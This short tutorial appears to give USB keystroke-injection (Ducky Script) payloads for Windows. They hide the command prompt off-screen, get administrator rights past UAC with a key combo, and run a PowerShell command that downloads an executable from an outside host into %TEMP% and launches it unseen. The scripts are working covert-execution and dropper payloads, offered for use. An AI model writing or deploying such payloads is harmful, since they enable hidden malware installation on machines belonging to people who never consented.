The following is an example of how to hide the command window below the bottom of the screen while typing in commands. The window movement part of the script can also be used on any other window. CMD.exe is also run with some command line flags for changing the appearance of the window to make it harder to view, and also a flag that turns on delayed expansion in the command prompt which allows for variable names to be called more than once in a line with no adverse effects. Ex... SET Something = Something + Something_Else

The following is an attempt to create a hide CMD window script that uses a key combo to run as administrator when UAC is turned on. 
```
REM Target: WINDOWS VISTA
REM Encoder V2.4
REM Purpose: Hide cmd window script that uses a key combo to circumvent UAC limitations. 
DELAY 3000
CONTROL ESCAPE
DELAY 500
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
CTRL-SHIFT ENTER
DELAY 1000
ALT C
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
```
Other windows can be hidden also, as demonstrated in this powershell hide, get, and execute. 
```

DELAY 3000

DELAY 1000
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe'); Start-Process "%TEMP%\bob.exe"
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M

REPEAT 100

```
Windows can also be hidden on other sides of the screen ex... replace DOWNARROW with RIGHTARROW, LEFTARROW, UPARROW.
